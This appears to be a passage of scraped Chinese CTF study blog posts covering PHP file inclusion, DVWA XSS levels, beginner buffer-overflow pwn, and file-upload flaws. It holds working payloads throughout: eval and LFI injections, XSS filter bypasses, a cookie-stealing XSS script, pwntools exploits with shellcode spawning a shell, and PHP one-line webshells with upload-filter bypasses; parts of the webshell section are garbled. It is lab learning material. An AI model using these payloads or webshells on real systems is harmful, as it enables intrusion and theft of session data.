&lt;?php include \"flag.php\"; $a = @$_REQUEST['hello']; eval( \"var_dump($a);\"); show_source(__FILE__);?&gt; 构造payload：);print_r(file(&quot;./flag.php&quot;) 即eval(&quot;var_dump();print_r(file(&quot;./flag.php&quot;));&quot;); 应用六源码： 12345678 &lt;?php show_source(__FILE__); if(isset($_REQUEST['path']))&#123; include($_REQUEST['path']); &#125;else&#123; include('phpinfo.php'); &#125;?&gt; 先通过伪协议扫描当前目录：&lt;?php print_r(scandir(&quot;.&quot;)); ?&gt; 直接访问flag.php得到flag。 phar://phar://是数据流包装器，自PHP5.3.0起开始有效，也是php的一个函数，功能是解压还原。 应用在php文件中写入&lt;?php phpinfo(); ?&gt;，将文件压缩后修改后缀名为jpg。 上传文件后构造payload：http://127.0.0.1/lianxi/phar1/include.php?file=phar://upload/11.jpg/11。 PHP文件包含漏洞在通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来，就会导致文件信息的的泄漏甚至注入了恶意代码 分类 远程文件包含（RFI）：?file=http://file/text.txt 本地文件包含（LFI）：?file=../text.txt PHP文件包含的几个函数 include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。 include_once()：和include()功能相同，区别在于当重复调用同一文件时，程序至调用一次。 require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。 require_once()：和require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。 %00截断（在PHP5.3.4之前有效）在$_GET[&quot;filename&quot;]中常见 形式：filename=test.php%00.txt 主要利用：上传时路径必须为 上传路径必须为txt、png等结尾时 文件下载时，绕过白名单检查 文件包含时，截断后面限制（主要是文件包含时） PS：PHP配置中magic_quotes_gpc=Off，即没有对数据进行转义解析。 从根目录搜寻/../../../../../../www/dvwa/php.ini 前面必须加/，表示从根目录开始。 双写重构造str_replace(array(&quot;../&quot;,&quot;..\\&quot;),&quot;&quot;,$file); payload：?page=/..././..././www/dvwa/php.ini file包含file://协议（本地包含文件）：将绝对路径下的文件包含进来。 漏洞利用： 上传一个内容为php的文件 利用file协议取包含上传文件（需要知道上传文件的绝对路径） 实现任意命令执行 PHP相关函数整理 函数 功能 extract() 从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 isset() 检测变量是否设置，并且不是 NULL。 trim() 移除字符串两侧的空白字符或其他预定义字符。 file_get_contents() 用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。 print_r() 显示关于一个变量的易于理解的信息。如果给出的是 string、integer 或 float，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。 scandir() 返回指定目录中的文件和目录的数组。 phpinfo() 输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和PHP授权信息(License)。 eval() 把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。 var_dump() 显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。 include() 获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。 show_source() 对文件进行语法高亮显示。 参考网站http://vinc.top/2016/09/28/%E3%80%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%91%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/https://lightless.me/archives/include-file-from-zip-or-phar.htmlhttps://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"https://qianfei11.github.io/tags/web/"}]},{"title":"WEB入门（四）","slug":"WEB入门（四）","date":"2018-07-08T01:08:01.000Z","updated":"2019-02-28T07:37:26.184Z","comments":true,"path":"2018/07/08/WEB入门（四）/","link":"","permalink":"https://qianfei11.github.io/2018/07/08/WEB入门（四）/","excerpt":"涛哥带我学XSS。","text":"涛哥带我学XSS。 基础知识HTML一种超文本标记语言。其结构包括头部分（Head）和主体部分（Body），其中头部提供关于网页的信息，主体部分提供网页的具体内容。由HTML各类标签组成。 各类标签： 标签 功能 img 插入图片 body 文档的主体 iframe 在网页显示网页 Javascript一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在HTML网页上使用，用来给HTML网页增加动态功能。 cookie与session会话（Session）跟踪是Web程序中常用的技术，用来跟踪用户的整个会话。常用的会话跟踪技术是Cookie与Session。Cookie通过在客户端记录信息确定用户身份，Session通过在服务器端记录信息确定用户身份。 WAFWeb应用防护系统（也称：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。国际上公认的一种说法是：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。 Javascript弹框操作Javascript函数内嵌实现形式：&lt;script&gt;Javascript的函数&lt;/script&gt; 相关函数： alert()：用于提示 confirm()：用于和用户交互确认 prompt()：弹框让用户输入信息 XSS跨站脚本攻击（cross site script execution），一种出现在web应用程序中的计算机安全漏洞。由于web应用对用户的输入过滤不严而产生。恶意攻击者通过HTML注入篡改网页，插入恶意脚本，从而控制用户浏览器行为的一种攻击方式。 危害 网络钓鱼，包括盗取各类的用户账号 窃取用户cookie 强制弹出广告页面，刷流量 页面挂马 提升用户权限，进一步渗透网站 传播扩展脚本蠕虫 相比于SQL注入，SQL注入是对后端的恶意篡改，而XSS是对前端的恶意攻击。 反射型XSS也称为非持久性、参数型跨站脚本。主要用于将恶意的脚本附加到URL地址的参数中。 一般使用的已经构造好的恶意URL发送给受害者，诱使受害者点击触发，只执行一次。 存储型XSS比反射型跨站脚本更具威胁，并且可能影响到web服务器的自身安全。 攻击者事先将恶意JavaScript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。 绕过XSS限制 绕过magic_quotes_gpc（通过String.fromCharCode()函数） HEX编码 改变大小写 关闭标签（&gt;&lt;script&gt;slert(&#39;xss&#39;);&lt;/script&gt;）（闭合前面的标签） 相关PHP函数 str_replace()：以其他字符替换字符串中的一些字符（区分大小写） addslashes()：在预定义字符（&#39;、&quot;、\\、NULL）之前添加反斜杠 stripslashes()：删除由addslashes()函数添加的反斜杠 trim()：移除字符串两侧的空白字符或其他预定义字符 htmlspecialchars()：把预定义的字符转换为HTML实体（&amp;（和号）成为&amp;；&quot;（双引号）成为&quot;；&#39;（单引号）成为 ‘；&lt;（小于）成为&lt;；&gt;（大于）成为&gt;） htmlspecialchars_decode()：把预定义的HTML实体转换为字符 mysql_real_escape_string()：对字符串中的特殊符号（\\x00、\\n、\\r、\\、&#39;、&quot;、\\x1a）进行转义 strip_tags()：剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用标签 DVWA之XSS今天在这里遇到了两个坑记录一下。 发现Metasploitable中的DVWA版本有点新，High Level竟然就是Impossible Level。最后还是用了以前PHPSTUDY里的旧版本来实验。 还有就是重置数据库的时候出现了无法删除dvwa数据库的错误。在命令行和图形界面都删除不了，最后直接去mysql目录下删除，才可以重置。 实验中主要根据源码分析被过滤的部分，寻找绕过的方法。 XSS Reflected（反射型XSS）反射型相对简单一些。 Low源码： 1234567&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; 这里显然对输入内容没有任何过滤。直接输入&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;就有弹窗回显。 Medium源码： 123456789&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; 这里通过str_replace函数，将字符串&lt;script&gt;替换成空串，故只要双写或是大小写混用即可绕过。 构造payload&lt;SCript&gt;alert(&#39;1&#39;)&lt;/script&gt;或者&lt;scri&lt;script&gt;pt&gt;alert(&#39;1&#39;)&lt;/script&gt;。 High源码： 123456789&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; 源码中将所有的&lt;script&gt;完全过滤了（正则表达式中/i表示不区分大小写），使用&lt;script&gt;标签没有任何作用，所以需要通过其他方式。 在HTML的标签中，img、body、iframe等标签的src注入恶意代码。payload为：&lt;img src=1 onerror=alert(&quot;1&quot;) /&gt;（onerror事件会在文档或图像加载过程中发生错误时被触发。在装载文档或图像的过程中如果发生了错误，就会调用该事件句柄。） Impossible源码： 12345678910111213&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这里使用了htmlspecialchars()函数，将输入的恶意代码转换成HTML实体，完全过滤了恶意代码，无法进行攻击。 XSS Stored（存储型XSS）存储型大多数存在留言板中，留言板又一般存在几个文本输入框。每个输入框都可以测试一下是否存在XSS。 每次成功弹窗后，恶意代码都会被存储到数据库中，所以每次进入该页面都会出现之前的弹窗。 Low源码： 12345678910111213141516&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitize name input $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 源码中对name和message处的信息没有做任何过滤，故可以直接尝试xss。 在message一栏直接输入&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;就可以出发弹窗。在name一栏中有字数长度限制，故用burpsuite抓包之后，再修改name栏中的字符串为&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;，放包后触发弹窗。 Medium源码： 12345678910111213141516 &lt;?phpif(isset($_POST['btnSign']))&#123; $message = trim($_POST['mtxMessage']); $name = trim($_POST['txtName']); // Sanitize message input $message = trim(strip_tags(addslashes($message))); $message = mysql_real_escape_string($message); $message = htmlspecialchars($message); // Sanitize name input $name = str_replace('&lt;script&gt;', '', $name); $name = mysql_real_escape_string($name); $query = \"INSERT INTO guestbook (comment,name) VALUES ('$message','$name');\"; $result = mysql_query($query) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );&#125;?&gt; 这里和前一题一样，通过str_replace函数，将字符串&lt;script&gt;替换成空串。 name处可以继续通过抓包来进行XSS。而message处输入的内容被htmlspecialchars()函数过滤，不存在XSS。 High源码： 123456789101112131415161718&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 在name处和上一题的high level处是一样的漏洞。故虽然过滤了&lt;script&gt;，我们还是可以通过HTML的标签触发事件，引起弹窗。 Impossible源码： 123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Check Anti-CSRF tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); $data-&gt;bindParam( ':message', $message, PDO::PARAM_STR ); $data-&gt;bindParam( ':name', $name, PDO::PARAM_STR ); $data-&gt;execute();&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 将name和message处输入的数据都经过htmlspecialchars()函数的处理，完全被过滤。 XSS盗取cookie攻击原理：通过XSS漏洞，利用一些js函数来获取用户信息。 先在网站根目录下放入如下php文件： 1234&lt;?php $cookie = $_GET['cookie']; file_put_contents('cookie.txt', $cookie)?&gt; PHP文件中的&#39;很容易和中文的单引号‘搞混。 以下为XSS的payload： 1&lt;script&gt;document.location=\"http://127.0.0.1/dvwa/cookie.php?cookie=\"+document.cookie;&lt;/script&gt; 输入payload后，在网站根目录下cookie.txt中存入了cookie的值。 BeEFThe Browser Exploitation Framework，一个著名的XSS利用框架，是一个交互界面友好、高度集成、开源的一个项目。BeEF可以和MSF结合起来一起使用。 PS：MSF是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。 如何用BeEF进行客户端劫持： 在Kali下打开BeEF 得到管理界面的URL和攻击URL 利用XSS漏洞来访问攻击的URL 参考网站http://www.freebuf.com/articles/web/123779.htmlhttps://www.cnblogs.com/andy-zhou/p/5360107.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"web","slug":"web","permalink":"https://qianfei11.github.io/tags/web/"}]},{"title":"PWN入门（二）","slug":"PWN入门（二）","date":"2018-07-07T05:23:05.000Z","updated":"2019-02-28T05:59:34.733Z","comments":true,"path":"2018/07/07/PWN入门（二）/","link":"","permalink":"https://qianfei11.github.io/2018/07/07/PWN入门（二）/","excerpt":"初涉PWN。","text":"初涉PWN。 关于PWN底层的原理栈帧平衡一些基本内容： ESP：栈指针寄存器，存放一个指针，该指针永远指向系统栈最上面的栈帧的栈顶 EBP：基址指针寄存器，该指针永远指向系统栈最上面的栈帧的底部 函数栈帧：ESP和EBP之间内存空间为当前栈帧 在函数栈帧中一般包含以下几种信息： 局部变量：为函数举报变量开辟的内存空间 栈帧状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡得到） 函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置 如何保证栈帧平衡： 1234567PUSH EBP // 将栈底指针存入栈，即保存当前栈帧状态值MOV EBP,ESP // 将栈顶的值赋给栈底，即讲当前栈帧切换到新栈帧XXXXXX // 函数中间部分MOV ESP,EBP // 将栈底的值赋给栈顶，即降低栈顶，回首当前栈帧空间POP EBP // 弹出栈底指针，即将当前栈帧底部保存的前栈帧值弹出，恢复出上一个栈帧 函数返回的步骤： 保存返回值，通常将函数的返回值保存在寄存器EAX中。 弹出当前帧，恢复上一个栈帧。具体包括： 在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收当前栈帧的空间。 将当前栈帧底部保存的前栈帧EBP值弹入EBP寄存器，恢复出上一个栈帧。 将函数返回地址弹给EIP寄存器。 跳转：按照函数返回地址跳回母函数中继续执行。 PS：栈的守护天使——GS，也称作Stack Canary/Cookie 调用函数（Call）CALL可以化为两部分，即Push retaddr + Jump。先讲函数返回的地址入栈，再跳转到函数执行的位置处。 返回值（Ret）RET也可以转化为两部分，即Pop retaddr + Jump。先是把返回值的地址出栈，再跳转回原本调用函数处。 缓冲区溢出（Buffer Overflow）缓冲区溢出是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容，从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。 缓冲区溢出原指当某个数据超过了处理程序限制的范围时，程序出现的异常操作。 尤其是C语言，不像其他一些高级语言会自动进行数组或者指针的边界检查，增加溢出风险。C语言中的C标准库还具有一些非常危险的操作函数，使用不当也为溢出创造条件。 Linux下的Pwn常用命令 命令 功能 cd 进入文件夹 ls 列出当前目录下的所有文件 mkdir 创建文件夹 pwd 显示当前所在目录 chmod 改变文件使用权限 objdump 查看目标文件或者可执行的目标文件的构成 gdb 使用gdb进行调试 checksec 检测二进制的保护机制是否开启（peda中的命令） Linux下的Pwn常用到的工具 gdb：Linux调试中必要用到的 gdb-peda：gdb方便调试的工具，类似的工具有gef，gdbinit，这些工具的安装可以参考：http://blog.csdn.net/gatieme/article/details/63254211 pwntools：写exp和poc的利器 checksec：可以很方便的知道elf程序的安全性和程序的运行平台 objdump和readelf：可以很快的知道elf程序中的关键信息 ida pro：强大的反编译工具 ROPgadget：强大的rop利用工具 one_gadget：可以快速的寻找libc中的调用exec(‘bin/sh’)的位置 libc-database：可以通过泄露的libc的某个函数地址查出远程系统是用的哪个libc版本 gdb基本命令 命令 功能 start 开始调试 pattc 生成规律字符串 patto 查找字符串 q 退出 n 执行一行源代码但不进入函数内部 ni 执行一行汇编代码但不进入函数内部 s 执行一行源代码而且进入函数内部 si 执行一行汇编代码而且进入函数内部 c 继续执行到下一个断点 b 下断点 stack 显示栈信息 x 按十六进制格式显示内存数据 r 运行代码 Pwntools基本函数 函数 功能 process() sendline() 向目标发送一行字符串 interactive() 实现和程序之间的交互 remote() 远程连接 context() 设置运行时变量 p32()/p64() 把整数转化为32/64位的字符串 u32()/u64() 把32/64位字符串转化成整数 asm()/disasm() 快速汇编/反汇编 log() 输出消息 Pwn的小练习第一次做pwn题，虽然是在有源码的情况下。但是还是被pwn的神奇所震撼。 p1程序源码： 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vmd()&#123; system(\"sh\");&#125;void A()&#123; char a[100]; scanf(\"%s\",a); return;&#125;int main()&#123; A();&#125; 输入gcc p1.c -o p1 -m32，用来编译32位的程序。 直接覆盖返回地址根据源文件可以判断该程序调用A()函数时，在scanf中没有对字符串的长度做限制，即存在缓冲区溢出。 根据源码，本题的思路应该为通过缓冲区溢出，将RET处的地址修改为cmd()函数的地址，直接跳转到该函数后getshell。故先通过objdump命令寻找到cmd函数的地址 然后输入gdb p1进入gdb调试界面。start开始调试程序。 已知偏移量为112后，容易知道可以直接通过溢出在RET处覆盖原本的地址，直接跳至cmd()函数处。 payload如下： 12345from pwn import *payload = \"A\" * 112 + \"\\x6b\\x84\\x04\\x08\"p = process(\"./p1\")p.sendline(payload)p.interactive() Ret_slide在不知道返回地址偏移时，通过滑翔机（Ret_slide）设置payload减少尝试次数。即RET前的字符串利用其他RET地址来填充。 因为RET相当于POP和JMP两个步骤，每次RET都会重新返回到上一个地址，最后执行到目标地址时就会直接跳转。 payload： 12345from pwn import *payload = \"\\x08\\x04\\x84\\xa0\" * 28 + \"\\x6b\\x84\\x04\\x08\"p = process(\"./p1\")p.sendline(payload)p.interactive() 3-13程序源码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void A()&#123; setvbuf(stdout, 0, _IONBF, 0); srand(time(0) ^ getpid()); char buf[100]; int magic = rand(); gets(buf); if (atoi(buf) == magic) &#123; puts(\"Okay...\"); system(\"sh\"); &#125;&#125;int main()&#123; A();&#125; 同样输入gcc 3-13.c -o 3-13 -m32来编译。 调试一开始发现权限不够，通过chmod +x 3-13来获得可执行权限。 源代码中使用了gets()函数，存在缓存区溢出，故第一个想法应该就是通过对变量buf操作使其覆盖变量magic的值，使两者相同后得到shell。 buf被定义为一个占100字节的字符串，而magic被定义为一个占4字节的整型。 根据调试过程可以知道，buf的地址为0xffffcf68，而magic的地址为0xffffcfcc。buf的地址比magic的地址更低，两者在栈中显然是先压入magic再压入buf。又因为输入数据是从低位向高位输入，那么我们可以通过变化buf的值来覆盖magic的值。最简单的方法显然是让两者都等于零。 根据以上的推测，那么输入字符串的长度应当至少为100+4=104字节才可能完全覆盖变量magic。 故payload为： 12345from pwn import *p = process('./3-13')payload = '\\0' * 104p.sendline(payload)p.interactive() 这里的\\0也就是\\x00，而如果输入的是字符0，转为十六进制后为\\x30，将不能满足条件，无法getshell。 这题附上老梅的payload，这里可以放shellcode： 123456789101112from pwn import *offset=116r=process(\"3-13\")elf=ELF(\"3-13\")bss=elf.bss()get=elf.symbols['gets']shell=\"\\xeb\\x1b\\x5f\\x31\\xc0\\x6a\\x53\\x6a\\x18\\x59\\x49\\x5b\\x8a\\x04\\x0f\\xf6\\xd3\\x30\\xd8\\x88\\x04\\x0f\\x50\\x85\\xc9\\x75\\xef\\xeb\\x05\\xe8\\xe0\\xff\\xff\\xff\\x1c\\x7f\\xc5\\xf9\\xbe\\xa3\\xe4\\xff\\xb8\\xff\\xb2\\xf4\\x1f\\x95\\x4e\\xfe\\x25\\x97\\x93\\x30\\xb6\\x39\\xb2\\x2c\"payload=\"A\"*offset+p32(get)+p32(bss)+p32(bss)r.sendline(payload)r.sendline(shell)r.sendline('/bin/sh')r.interactive() 参考网站https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BAhttps://paper.seebug.org/481/https://bbs.pediy.com/thread-212691.htmhttp://blog.xiyoulinux.org/detail.jsp?id=1965http://www.cnitblog.com/houcy/archive/2013/03/16/87075.htmlhttps://blog.csdn.net/qq_29343201/article/details/51337025http://www.91ri.org/14382.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"WEB入门（三）","slug":"WEB入门（三）","date":"2018-07-06T01:04:22.000Z","updated":"2019-02-28T07:37:41.174Z","comments":true,"path":"2018/07/06/WEB入门（三）/","link":"","permalink":"https://qianfei11.github.io/2018/07/06/WEB入门（三）/","excerpt":"今天学姐主要讲了文件上传漏洞，了解了Cknife等工具的使用。","text":"今天学姐主要讲了文件上传漏洞，了解了Cknife等工具的使用。 文件上传漏洞上传的文件不进行限制，有可能会被利用于上传可执行文件、脚本到服务器上，并且通过脚本文件可以获得执行服务器端命令的能力 木马根据语言分类，有PHP、ASP、JSP、ASP.NET等不同语言下的木马；根据作用分类，有大马和小马。 PHP一句话木马： ehco shell_exec($_GET['a']); ?>```1- ```&lt;?php ehco shell_exec($_POST[&apos;a&apos;]); ?&gt; @eval($_POST['a']); ?>```1234ASP一句话木马：- ```&lt;%eval request(&quot;Cknife&quot;)%&gt; ASP.NET一句话木马： Page Language12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273## 利用函数1. shell_exec(): 通过环境执行命令，并且将完整的输出以字符串的方式返回。2. eval(): 把字符串作为PHP代码执行执行a接收到的内容。## phpinfo()介绍|内容:-:|:-:语法|int phpinfo(void);返回值|整数函数种类|PHP系统功能phpinfo()会泄漏很多敏感的信息。1. 绝对路径（_SERVER[&quot;script_FILENAME&quot;]）找到phpinfo()可以直接找到网站的绝对路径。2. 支持的程序可以查看一些特殊的程序服务，诸如redis、memcache、mysql、SMTP、curl。要是服务器装了redis或者memcache，就可以通过ssrf来getshell。3. 泄漏真实ip（_SERVER[&quot;SERVER_ADDR&quot;]或者SERVER_ADDR）得到的ip可以直接用来查旁站和c段。4. GOPHER如果支持gopher也能直接用ssrf。5. fastcgi查看是否开启fastcgi和查看fastcgi的版本，可能导致解析漏洞、远程命令执行、任意文件读取等问题。6. 泄漏缓存文件地址（_FILES[&quot;file1&quot;]）向phpinfo()post一个shell后，可以在&quot;_FILE[&quot;file1&quot;]&quot;中看到上传的临时文件，如果有个LFI，便可以直接getshell。7. 一些敏感配置&gt; * allow_url_include：远程文件包含&gt; * disable_functions：查看金庸函数&gt; * open_basedir：读取一些没权限的目录还能获取一些环境信息，如environment中的path、log等。## Linux基本命令- ls：列出当前目录下所有文件- pwd：查看文件当前目录# Cknife（菜刀）超级强大的网站管理工，分为客户端和代码两部分只要将那简短的一句话代码放到网站上去就可以取得网站的权限运行环境：安装了JRE1.7+环境的所有操作系统主要功能：文件管理、虚拟终端、数据库管理## DVWA之File Uploadlow level的测试一下，源码中没有对任何文件格式进行过滤：1. 写出一句话木马用菜刀连接的一句话木马：```php&lt;?php @eval($_POST[&apos;a&apos;]; ?&gt; 直接在网页下通过GET的一句话木马： 1&lt;?php echo shell_exec($_GET['a']); ?&gt; 在网页下用hackbar通过POST的一句话木马： 1&lt;?php echo shell_exec($_POST['a']); ?&gt; 上传一句话木马直接在网页查到文件 Cknife连接 源码： 123456789101112131415161718 &lt;?php if (isset($_POST['Upload'])) &#123; $target_path = DVWA_WEB_PAGE_TO_ROOT.\"hackable/uploads/\"; //上传路径为../../hackable/uploads/ $target_path = $target_path . basename( $_FILES['uploaded']['name']); //上传路径加上上传的文件名 if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) &#123; //对是否上传成功做出判断，因此所有格式的文件都能上传 echo '&lt;pre&gt;'; echo 'Your image was not uploaded.'; echo '&lt;/pre&gt;'; &#125; else &#123; echo '&lt;pre&gt;'; echo $target_path . ' succesfully uploaded!'; echo '&lt;/pre&gt;'; &#125; &#125;?&gt; 文件上传漏洞检测 客户端javascript检测：通常在本地检测文件的扩展名 服务端MIME类型检测：通常检测的是Content-Type内容 服务端目录路径检测：通常根path参数相关的内容 服务端文件扩展名检测：通常检测跟文件extension相关的内容 服务端文件内容检测：检测文件内容是否合法或含有恶意代码 客户端javascript检测在客户端使用js对不合法图片进行检查 绕过： 禁用页面js 先把文件改成符合条件的文件格式上传，在抓包，修改文件的后缀名 服务端检测绕过（MIME类型检测）通过判断$_FILES[&#39;userfile&#39;][&#39;type&#39;]!=&quot;imgae/gif&quot;来保证上传的文件类型为gif 绕过：通过burp抓包，将原来的Content-Type类型改为符合要求的类型 1Content-Type: application/octet-stream application/octet-stream即为php文件的文件类型格式 服务端目录路径检测上传路径为/image/20160704时，可以通过修改为image/20160704/eval.php%00filename.gif 通过%00截断最终导致存储的文件名为eval.php 服务端文件扩展名检测分为黑名单检测和白名单检测 黑名单检测接收上传的文件做对比，如果匹配到黑名单中的后缀名，则不允许上传 绕过： 后缀名大小写绕过，例如：将Burpsuite截获的数据包中的文件名evil.php改evil.php 名单列表绕过，尝试使用非黑名单内的后缀名，如php5，php7等 